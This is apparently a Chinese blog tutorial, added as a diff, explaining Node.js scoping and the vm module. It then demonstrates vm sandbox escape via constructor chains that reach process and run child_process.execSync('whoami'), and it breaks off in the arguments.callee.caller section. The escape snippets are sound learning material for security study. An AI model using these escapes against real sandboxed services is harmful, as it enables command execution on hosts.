@@ -1,0 +1,1125 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="沙箱逃逸初识https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;11859#toc-0 几乎是复现这篇文章，写文章是为了督促自己学习，顺便保存到本地 概念nodejs是javascript的运行环境，简单来说写在后端的javascript叫做nodejs 沙箱在我看来就是开创一个独立空间来运行有害的代码，从而避免影响到主机的功能 nodejs通过vm模块来创建一个沙箱 node将字符串执行为代码age">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vm沙箱逃逸初识">
+<meta property="og:url" content="https://zer0peach.github.io/2023/11/20/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="沙箱逃逸初识https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;11859#toc-0 几乎是复现这篇文章，写文章是为了督促自己学习，顺便保存到本地 概念nodejs是javascript的运行环境，简单来说写在后端的javascript叫做nodejs 沙箱在我看来就是开创一个独立空间来运行有害的代码，从而避免影响到主机的功能 nodejs通过vm模块来创建一个沙箱 node将字符串执行为代码age">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231120214548117.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231120215301885.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121190950763.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121191439463.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121201038924.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121200900952.png">
+<meta property="article:published_time" content="2023-11-20T12:56:48.000Z">
+<meta property="article:modified_time" content="2023-11-21T16:39:00.511Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231120214548117.png">
+  
+  
+  
+  <title>vm沙箱逃逸初识 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vm沙箱逃逸初识"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-20 20:56" pubdate>
+          2023年11月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          132 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">vm沙箱逃逸初识</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="沙箱逃逸初识"><a href="#沙箱逃逸初识" class="headerlink" title="沙箱逃逸初识"></a>沙箱逃逸初识</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859#toc-0">https://xz.aliyun.com/t/11859#toc-0</a></p>
+<p>几乎是复现这篇文章，写文章是为了督促自己学习，顺便保存到本地</p>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>nodejs是javascript的运行环境，简单来说写在后端的javascript叫做nodejs</p>
+<p>沙箱在我看来就是开创一个独立空间来运行有害的代码，从而避免影响到主机的功能</p>
+<p>nodejs通过vm模块来创建一个沙箱</p>
+<h2 id="node将字符串执行为代码"><a href="#node将字符串执行为代码" class="headerlink" title="node将字符串执行为代码"></a>node将字符串执行为代码</h2><p>age.txt</p>
+<div class="code-wrapper"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">18</span></code></pre></div>
+
+<p>1.js</p>
+<div class="code-wrapper"><pre><code class="hljs autoit"><span class="hljs-keyword">const</span> fs = require(<span class="hljs-string">&quot;fs&quot;</span>)<span class="hljs-comment">;</span>
+let y1 = fs.readFileSync(<span class="hljs-string">&#x27;age.txt&#x27;</span>,<span class="hljs-string">&#x27;utf-8&#x27;</span>)<span class="hljs-comment">;</span>
+console.<span class="hljs-built_in">log</span>(y1)<span class="hljs-comment">;</span>
+<span class="hljs-built_in">eval</span>(y1)<span class="hljs-comment">;</span>
+console.<span class="hljs-built_in">log</span>(age)<span class="hljs-comment">;</span>
+
+
+
+<span class="hljs-meta">##var age=18</span>
+<span class="hljs-meta">##18</span></code></pre></div>
+
+<p><code>fs.readFileSync</code>是用来读取文件，也就是<code>y1</code>其实是字符串，我们通过<code>eval</code>执行了一个字符串</p>
+<p>但若当前作用域下已经有了同名的age变量就会报错</p>
+<div class="code-wrapper"><pre><code class="hljs crmsh">const fs = require(<span class="hljs-string">&quot;fs&quot;</span>);
+let y1 = fs.readFileSync(&#x27;age.txt&#x27;,&#x27;utf-<span class="hljs-number">8</span>&#x27;);
+
+let age = <span class="hljs-number">20</span>;
+
+console.log(y1);
+eval(y1);
+console.log(age);
+
+
+
+SyntaxError: Identifier &#x27;age&#x27; has already been declared
+    at Object.<span class="hljs-tag">&lt;anonymous&gt;</span> (d:\ctf文件\nep\<span class="hljs-number">1</span>.js:<span class="hljs-number">7</span>:<span class="hljs-number">6</span>)
+    at Module._compile (<span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/modules/cjs/loader:<span class="hljs-number">1256</span>:<span class="hljs-number">14</span>)
+    at Module._extensions..js (<span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/modules/cjs/loader:<span class="hljs-number">1310</span>:<span class="hljs-number">10</span>)
+    at Module.load (<span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/modules/cjs/loader:<span class="hljs-number">1119</span>:<span class="hljs-number">32</span>)
+    at Module._load (<span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/modules/cjs/loader:<span class="hljs-number">960</span>:<span class="hljs-number">12</span>)
+    at Function.executeUserEntryPoint [as runMain] (<span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/modules/run_main:<span class="hljs-number">86</span>:<span class="hljs-number">12</span>)
+    at <span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/main/run_main_module:<span class="hljs-number">23</span>:<span class="hljs-number">47</span></code></pre></div>
+
+<h3 id="方法二：new-function"><a href="#方法二：new-function" class="headerlink" title="方法二：new function"></a>方法二：new function</h3><p>上面使用eval会受到作用域的限制，我们可以使用<code>new Function</code>自己创建一个作用域</p>
+<div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">let</span> age = <span class="hljs-number">20</span>;
+
+<span class="hljs-keyword">const</span> y2 = <span class="hljs-keyword">new</span> Function(<span class="hljs-string">&#x27;age&#x27;</span>,<span class="hljs-string">&#x27;return age+1&#x27;</span>);   <span class="hljs-comment">//Function记得大写</span>
+console.log(y2(age));
+
+
+<span class="hljs-meta">## 21</span></code></pre></div>
+
+<p><code>new Function</code>的第一个参数是形参名称，第二个参数是函数体</p>
+<p>我们都知道函数内和函数外是两个作用域，不过当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，当参数过多时这种方法就变的麻烦起来了。</p>
+<p>从上面两个执行代码的例子可以看出来其实我们的思想就是如何创建一个<strong>能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域</strong>，这也就是vm模块的作用</p>
+<h2 id="nodejs作用域"><a href="#nodejs作用域" class="headerlink" title="nodejs作用域"></a>nodejs作用域</h2><p>Node项目时往往要在一个文件里<code>ruquire</code>其他的<code>js</code>文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的作用域（也叫上下文），包之间的作用域是互相隔离不互通的，也就是说就算我在y1.js中<code>require</code>了y2.js，那么我在y1.js中也无法直接调用y2.js中的变量和函数</p>
+<div class="code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-comment">//age.js</span>
+
+<span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs livecodeserver">//y2.js
+const <span class="hljs-keyword">a</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./age&#x27;</span>)
+console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">a</span>.age)
+
+
+<span class="hljs-comment">##undefined</span></code></pre></div>
+
+<p>要想使用age，要用元素输出的接口<code>exports</code> ，把<code>age.js</code>修改成下面这样：</p>
+<div class="code-wrapper"><pre><code class="hljs delphi"><span class="hljs-comment">//age.js</span>
+<span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span>
+
+<span class="hljs-keyword">exports</span>.age = age</code></pre></div>
+
+<p>JavaScript中<code>window</code>是全局对象，浏览器其他所有的属性都挂载在<code>window</code>下，那么在服务端的Nodejs中和<code>window</code>类似的全局对象叫做<code>global</code>，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用<code>global.xxx</code>的方式来访问，直接用<code>xxx</code>就可以调用这个变量。举个例子，<code>console</code>就是挂载在global下的一个全局变量，我们在用<code>console.log</code>输出时并不需要写成<code>global.console.log</code>，其他常见全局变量还有process（一会逃逸要用到）</p>
+<p>这一部分学了javascript的人会很容易理解</p>
+<p>所以我们可以手动生命全局变量，但全局变量在每个包中都是共享的，很容易被污染</p>
+<div class="code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">//y1.js</span>
+<span class="hljs-string">global.age</span> <span class="hljs-string">=</span> <span class="hljs-number">20</span>
+
+
+<span class="hljs-string">//y2.js</span>
+<span class="hljs-string">const</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&quot;./y1&quot;)</span>
+
+<span class="hljs-string">console.log(age)</span>
+
+
+
+
+
+
+<span class="hljs-string">console.log(global)</span>
+
+<span class="hljs-string">//global对象</span>
+<span class="hljs-string">&lt;ref</span> <span class="hljs-string">*1&gt;</span> <span class="hljs-string">Object</span> [<span class="hljs-string">global</span>] &#123;
+  <span class="hljs-attr">global:</span> [<span class="hljs-string">Circular</span> <span class="hljs-string">*1</span>],
+  <span class="hljs-attr">queueMicrotask:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">queueMicrotask</span>],
+  <span class="hljs-attr">clearImmediate:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">clearImmediate</span>],
+  <span class="hljs-attr">setImmediate:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">setImmediate</span>] &#123;
+    [<span class="hljs-string">Symbol(nodejs.util.promisify.custom)</span>]<span class="hljs-string">:</span> [<span class="hljs-string">Getter</span>]
+  &#125;,
+  <span class="hljs-attr">structuredClone:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">structuredClone</span>],
+  <span class="hljs-attr">clearInterval:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">clearInterval</span>],
+  <span class="hljs-attr">clearTimeout:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">clearTimeout</span>],
+  <span class="hljs-attr">setInterval:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">setInterval</span>],
+  <span class="hljs-attr">setTimeout:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">setTimeout</span>] &#123;
+    [<span class="hljs-string">Symbol(nodejs.util.promisify.custom)</span>]<span class="hljs-string">:</span> [<span class="hljs-string">Getter</span>]
+  &#125;,
+  <span class="hljs-attr">atob:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">atob</span>],
+  <span class="hljs-attr">btoa:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">btoa</span>],
+  <span class="hljs-attr">performance:</span> <span class="hljs-string">Performance</span> &#123;
+    <span class="hljs-attr">nodeTiming:</span> <span class="hljs-string">PerformanceNodeTiming</span> &#123;
+      <span class="hljs-attr">name:</span> <span class="hljs-string">&#x27;node&#x27;</span>,
+      <span class="hljs-attr">entryType:</span> <span class="hljs-string">&#x27;node&#x27;</span>,
+      <span class="hljs-attr">startTime:</span> <span class="hljs-number">0</span>,
+      <span class="hljs-attr">duration:</span> <span class="hljs-number">42.1528000831604</span>,
+      <span class="hljs-attr">nodeStart:</span> <span class="hljs-number">2.7959001064300537</span>,
+      <span class="hljs-attr">v8Start:</span> <span class="hljs-number">6.785400152206421</span>,
+      <span class="hljs-attr">bootstrapComplete:</span> <span class="hljs-number">29.24240016937256</span>,
+      <span class="hljs-attr">environment:</span> <span class="hljs-number">15.710000038146973</span>,
+      <span class="hljs-attr">loopStart:</span> <span class="hljs-number">-1</span>,
+      <span class="hljs-attr">loopExit:</span> <span class="hljs-number">-1</span>,
+      <span class="hljs-attr">idleTime:</span> <span class="hljs-number">0</span>
+    &#125;,
+    <span class="hljs-attr">timeOrigin:</span> <span class="hljs-number">1700487785879.164</span>
+  &#125;,
+  <span class="hljs-attr">fetch:</span> [<span class="hljs-attr">AsyncFunction:</span> <span class="hljs-string">fetch</span>],
+  <span class="hljs-attr">age:</span> <span class="hljs-number">20</span>
+&#125;</code></pre></div>
+
+<h2 id="vm的一些函数（前置知识）"><a href="#vm的一些函数（前置知识）" class="headerlink" title="vm的一些函数（前置知识）"></a>vm的一些函数（前置知识）</h2><p><code>vm.runinThisContext(code)</code>：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性</p>
+<p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231120214548117.png" srcset="/img/loading.gif" lazyload alt="image-20231120214548117"></p>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>)
+
+<span class="hljs-keyword">let</span> localvar = <span class="hljs-string">&#x27;initial value&#x27;</span>;
+<span class="hljs-keyword">const</span> vmresult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localvar = &quot;123&quot;;&#x27;</span>);
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vmresult)
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(localvar)
+
+<span class="hljs-comment">//123</span>
+<span class="hljs-comment">//initial value</span></code></pre></div>
+
+<p>说明沙箱中的变量不会对当前作用域产生影响</p>
+<p><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前<code>global</code>外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p>
+<p>反正就是无法访问与沙箱同级的对象的属性</p>
+<p><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p>
+<p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231120215301885.png" srcset="/img/loading.gif" lazyload alt="image-20231120215301885"></p>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);
+<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);
+<span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span> = <span class="hljs-number">3</span>;
+<span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">globalVar</span>: <span class="hljs-number">1</span> &#125;;
+vm.<span class="hljs-title function_">createContext</span>(sandbox);
+vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox)); <span class="hljs-comment">// &#123; globalVar: 2 &#125;</span>
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(globalVar)); <span class="hljs-comment">// 3</span></code></pre></div>
+
+<p>结果应证了上面的说法</p>
+<ul>
+<li><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</li>
+<li><code>vm.Script类</code> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</li>
+<li><code>new vm.Script(code, options)</code>：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。</li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);
+<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);
+<span class="hljs-keyword">const</span> sandbox = &#123;
+    <span class="hljs-attr">animal</span>:<span class="hljs-string">&quot;cat&quot;</span>,
+    <span class="hljs-attr">count</span>:<span class="hljs-number">2</span>
+&#125;;
+<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;count +=1;name = &quot;kitty&quot;&#x27;</span>);
+<span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);
+script.<span class="hljs-title function_">runInContext</span>(context);
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox));
+
+<span class="hljs-comment">//&#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span></code></pre></div>
+
+<p>script对象可以通过runInXXXContext运行。</p>
+<h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><p>进行rce，我们要获取process对象，然后<code>require(&#39;child_process&#39;)</code></p>
+<p>但是我们上面说了在<code>creatContext</code>后是不能访问到<code>global</code>的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</p>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-meta">&quot;use strict&quot;</span>;
+<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);
+<span class="hljs-keyword">const</span> y1 = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return process&#x27;)()`</span>);
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y1);</code></pre></div>
+
+<p><code>this</code>指向的是当前传递给<code>runInNewContext</code>的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用<code>Function</code>的<code>constructor</code>生成的函数，最终返回了一个<code>process</code>对象</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">const y1 = vm.run<span class="hljs-constructor">InNewContext(`<span class="hljs-params">this</span>.<span class="hljs-params">toString</span>.<span class="hljs-params">constructor</span>(&#x27;<span class="hljs-params">return</span> <span class="hljs-params">process</span>&#x27;)</span><span class="hljs-literal">()</span>`);</code></pre></div>
+
+<p>这样子也可以返回process对象</p>
+<p>然后我们就能</p>
+<div class="code-wrapper"><pre><code class="hljs stylus">y1<span class="hljs-selector-class">.mainModule</span><span class="hljs-selector-class">.require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<span class="hljs-selector-class">.execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<span class="hljs-selector-class">.toString</span>()</code></pre></div>
+
+<p>知识星球上</p>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);
+<span class="hljs-keyword">const</span> script = <span class="hljs-string">`m + n`</span>;
+<span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">m</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">n</span>: <span class="hljs-number">2</span> &#125;;
+<span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);
+<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)</code></pre></div>
+
+<p>我们能不能把<code>this.toString.constructor(&#39;return process&#39;)()</code>中的this换成{}呢？ {}的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到global下的。</p>
+<p>如果我们将this换成m和n也是访问不到的，因为<strong>数字，字符串，布尔</strong>这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用。</p>
+<p>我们将mn改成其他类型就可以利用了：</p>
+<div class="code-wrapper"><pre><code class="hljs zephir"><span class="hljs-keyword">const</span> inspect = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>).inspect
+<span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);
+
+<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.Script(`
+(e =&gt; &#123;
+    <span class="hljs-keyword">const</span> y1 = x.toString.constructor(<span class="hljs-string">&#x27;return process&#x27;</span>)()  <span class="hljs-comment">//用m,n,x都行</span>
+    <span class="hljs-keyword">return</span> y1.mainModule.<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;whoami&#x27;</span>).toString()
+&#125;)()
+
+`)
+
+<span class="hljs-keyword">const</span> sandbox = &#123;m:[],n:&#123;&#125;,x: /regexp/&#125;;      <span class="hljs-comment">//只要m,n,x不为数字，字符串，布尔等都行</span>
+
+<span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.createContext(sandbox);
+
+<span class="hljs-keyword">const</span> res = script.runInContext(context);
+console.log(res);</code></pre></div>
+
+<h3 id="this-获取不到对象时-arguments-callee-caller"><a href="#this-获取不到对象时-arguments-callee-caller" class="headerlink" title="this 获取不到对象时             arguments.callee.caller"></a>this 获取不到对象时             arguments.callee.caller</h3><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);
+<span class="hljs-keyword">const</span> script = <span class="hljs-string">`...`</span>;
+<span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
+<span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);
